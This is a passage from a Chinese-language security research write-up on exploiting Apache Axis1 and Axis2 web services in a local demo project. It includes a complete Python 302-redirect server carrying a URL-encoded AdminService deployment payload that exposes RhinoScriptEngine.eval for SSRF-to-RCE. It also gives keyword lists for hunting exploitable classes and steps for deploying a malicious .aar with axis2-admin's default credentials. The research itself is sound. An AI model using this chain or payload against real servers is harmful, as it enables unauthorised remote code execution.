    Host: 127.0.0.1:8080
    Content-Type: text/xml; charset=utf-8
    Accept: application/soap+xml, application/dime, multipart/related, text/*
    User-Agent: Axis/1.4
    Cache-Control: no-cache
    Pragma: no-cache
    SOAPAction: ""
    Content-Length: 866
**缺陷：**
jdk7及之前的版本可以用，之后的版本就不是这个ScriptEngine类了，取代他的是NashornScriptEngine，但是这个NashornScriptEngine不能利用。
###### 1.4.1.4 说明
如果是白盒其实很容易找到很好用的利用类，在jdk中利用lookup的恶意类其实也很多，即使你碰到的环境是jdk8以上，jsp不解析，jndi也被禁用，但是应用依赖的三方包中依然存在很多可利用的恶意类，例如通过下面的关键词简单搜索筛选下也应该能找到一些：
    Runtime.getRuntime()
    new ProcessBuilder(
    .eval(
    .exec(
    new FileOutputStream(
    .lookup(
    .defineClass(
    ...
如果经常黑盒可以收集一些使用量较大的三方包中能利用的恶意类。
另一个问题就是作为恶意Bean的构造器选择问题，来看demo示例一个java.io.File作为参数的例子，这里直接在wsdd中配置HelloWorld
Service演示了，配置如下就行：
然后在HelloWord类中，写个测试方法，`public boolean saveFile(File file, byte[] bytes)
{`将File类作为参数，下面用soap ui来测试下：
下面是File构造器的选择，在1.2.6.1小节也说到了这个问题，感觉是个设计缺陷，这里construtors的第一个是两个String参数的构造器：
然后在org.apache.axis.encoding.ConstructorTarget#set通过构造器赋值，这里也是一个设计缺陷：
我传入的值分别为./和test.jsp，但是经过他的处理后args变成了./和./，接下来到example.HelloWorld#saveFile去看看值：
可以看到File的值为`./.`导致不存在而错误，再假设传入的值为./webapps/ROOT/test.jsp把，到这里就会变成./webapps/ROOT/test.jsp/webapps/ROOT/test.jsp还是不存在而错误。
所以寻找Bean这种作为参数的恶意类有时候会因为Axis的这些设计问题导致不一定能利用。
##### 1.4.2 利用AdminService + SSRF进行未授权RCE
由于AdminService只能localhost访问，一般来说，能进行post请求的ssrf不太可能，所以一般利用ssrf进行get请求来部署恶意服务，只需要找到一个ssrf即可rce。
在demo示例项目中，我添加了一个SSRFServlet，并且不是请求完成的url，而是解析出协议,ip，port重新组合再请求，这里这么模拟只是为了模拟更严苛环境下，依然可以利用重定向来利用这个漏洞，大多时候http的请求类默认应该是支持重定向的。用上面的RhinoScriptEngine作为恶意类来模拟。
302服务器：
    import logging
    import random
    import socket
    import sys
    import threading
    import time
    from http.server import SimpleHTTPRequestHandler, HTTPServer
    logger = logging.getLogger("Http Server")
    logger.addHandler(logging.StreamHandler(sys.stdout))
    logger.setLevel(logging.INFO)
    class HTTPServerV4(HTTPServer):
        address_family = socket.AF_INET
    class MHTTPServer(threading.Thread):
        def __init__(self, bind_ip='0.0.0.0', bind_port=666, requestHandler=SimpleHTTPRequestHandler):
            threading.Thread.__init__(self)
            self.bind_ip = bind_ip
            self.bind_port = int(bind_port)
            self.scheme = 'http'
            self.server_locked = False
            self.server_started = False
            self.requestHandler = requestHandler
            self.httpserver = HTTPServerV4
            self.host_ip = self.get_host_ip()
            self.__flag = threading.Event()
            self.__flag.set()
            self.__running = threading.Event()
            self.__running.set()
        def check_port(self, ip, port):
            res = socket.getaddrinfo(ip, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
            af, sock_type, proto, canonname, sa = res[0]
            s = socket.socket(af, sock_type, proto)
            try:
                s.connect(sa)
                s.shutdown(2)
                return True
            except:
                return False
            finally:
                s.close()
        def get_host_ip(self):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
            except Exception:
                ip = '127.0.0.1'
            finally:
                s.close()
            return ip
        def start(self, daemon=True):
            if self.server_locked:
                logger.info(
                    'Httpd serve has been started on {}://{}:{}, '.format(self.scheme, self.bind_ip, self.bind_port))
                return
            if self.check_port(self.host_ip, self.bind_port):
                logger.error('Port {} has been occupied, start Httpd serve failed!'.format(self.bind_port))
                return
            self.server_locked = True
            self.setDaemon(daemon)
            threading.Thread.start(self)
            detect_count = 10
            while detect_count:
                try:
                    logger.info('Detect {} server is runing or not...'.format(self.scheme))
                    if self.check_port(self.host_ip, self.bind_port):
                        break
                except Exception as ex:
                    logger.error(str(ex))
                time.sleep(random.random())
                detect_count -= 1
        def run(self):
            try:
                while self.__running.is_set():
                    self.__flag.wait()
                    if not self.server_started:
                        self.httpd = self.httpserver((self.bind_ip, self.bind_port), self.requestHandler)
                        logger.info("Starting httpd on {}://{}:{}".format(self.scheme, self.bind_ip, self.bind_port))
                        thread = threading.Thread(target=self.httpd.serve_forever)
                        thread.setDaemon(True)
                        thread.start()
                        self.server_started = True
                self.httpd.shutdown()
                self.httpd.server_close()
                logger.info('Stop httpd server on {}://{}:{}'.format(self.scheme, self.bind_ip, self.bind_port))
            except Exception as ex:
                self.httpd.shutdown()
                self.httpd.server_close()
                logger.error(str(ex))
        def pause(self):
            self.__flag.clear()
        def resume(self):
            self.__flag.set()
        def stop(self):
            self.__flag.set()
            self.__running.clear()
            time.sleep(random.randint(1, 3))
    class Http302RequestHandler(SimpleHTTPRequestHandler):
        location = ""
        def do_GET(self):
            status = 302
            self.send_response(status)
            self.send_header("Content-type", "text/html")
            self.send_header("Content-Length", "0")
            self.send_header("Location", Http302RequestHandler.location)
            self.end_headers()
    if __name__ == '__main__':
        Http302RequestHandler.location = "http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22RhinoScriptEngineService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22com.sun.script.javascript.RhinoScriptEngine%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22eval%22%20%2F%3E%3CtypeMapping%20deserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%20type%3D%22java%3Ajavax.script.SimpleScriptContext%22%20qname%3D%22ns%3ASimpleScriptContext%22%20serializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%20xmlns%3Ans%3D%22urn%3Abeanservice%22%20regenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment"
        httpd = MHTTPServer(bind_port=8888, requestHandler=Http302RequestHandler)
        httpd.start(daemon=True)
        while True:
            time.sleep(100000)
启动302服务器，访问
使用SSRFServlet请求302服务器并重定向到locaohost进行部署服务。
### 2\. Apache Axis2
Apache Axis2是Web服务/ SOAP / WSDL引擎，是广泛使用的[Apache
Axis1](http://ws.apache.org/axis/)
SOAP堆栈的后继者。与[Axis1.x架构](http://ws.apache.org/axis/java/architecture-guide.html)相比，Axis2所基于的新架构更加灵活，高效和可配置。新体系结构中保留了一些来自Axis 1.x的完善概念，例如处理程序等。
#### 2.1 搭建Axis2项目
##### 2.1.1 使用idea搭建Axis2
从Axis2官网下载[war](http://www.apache.org/dyn/closer.lua/axis/axis2/java/core/1.7.9/axis2-1.7.9-war.zip)包，解压war包之后将axis2-web和WEB-INF复制到项目的web目录下，结构如下：
然后可以在services目录下配置自己的service服务，部署到tomcat即可。项目demo放在了[github](https://github.com/longofo/ApacheAxis2VulDemo)
##### 2.1.2 访问WebService
如果按照上面步骤搭建的项目，访问首页之后会出现如下页面：
访问/axis2/services/listServices会出现所有已经部署好的web
services（Axis2不能像Axis1那样用直接访问/services/或用?list列出services了）。
#### 2.2 Axis2与Axis1配置文件的变化
##### 2.2.1 axis2.xml全局配置文件
在Axis1的全局配置和service配置都在server-config.wsdd中配置。但是Axis2的全局配置单独放到了axis2.xml中，下面说下和后面漏洞利用有关的两个配置：
配置了允许部署.aar文件作为service，.aar就是个压缩包文件，里面包含要部署的类和services.xml配置信息，官方默认也给了一个version-1.7.9.aar示例。
另一个配置是axis2-admin的默认登陆账号和密码，登陆上去之后可以上传.aar部署恶意service。
##### 2.2.2 services.xml
Axis2的service配置改为了在WEB-INF/services目录下配置，Axis2会扫描该目录下的所有xxx/META-INF/services.xml和services.list文件：
##### web.xml
Axis1中从web端部署service使用的是AdminService，在Axis2中改成了使用`org.apache.axis2.webapp.AxisAdminServlet`，在web.xml中配置：
#### 2.3 Axis2的漏洞利用
利用主要还是有两种：
  * 暴露在外部的web service能直接调用造成危害
  * 从上面的配置文件我们也可以看到，可以使用axis2-admin来部署.arr文件，.arr文件可以写入任意恶意的class文件，默认账号admin/axis2，不需要像axis1那样寻找目标服务器存在的class
利用axis2-admin上传.arr：
.arr文件的制作可以仿照version-1.7.9.aar，如下结构即可：
    META-INF
        services.xml(将ServiceClass配置成test.your即可)
    test
        your.class
#### 2.4 Axis2非默认配置的情况
上面的项目是直接复制了官方所有的配置文件，所以访问首页有官方给出的页面，以及axis2-admin，axis2-admin的AxisAdminServlet类不在官方的jar包中，只是在classes目录下，也就是说axis2-admin也是demo的一部分。如果不需要官方的那些东西的时候，axis2-admin的方式利用就不行了，但是也是能正常调用其他service的，项目结构如下：
此时访问http://127.0.0.1:8080/axis2/services/listServices会变成500，看下服务端的报错：
listServices.jsp找不到，之前能调用listServices是因为用了官方的demo。
但是直接访问service是正常的并且可以调用：
这种情况下，如果是黑盒就不太好办了，看不到service，只能暴力猜解service name。
* * *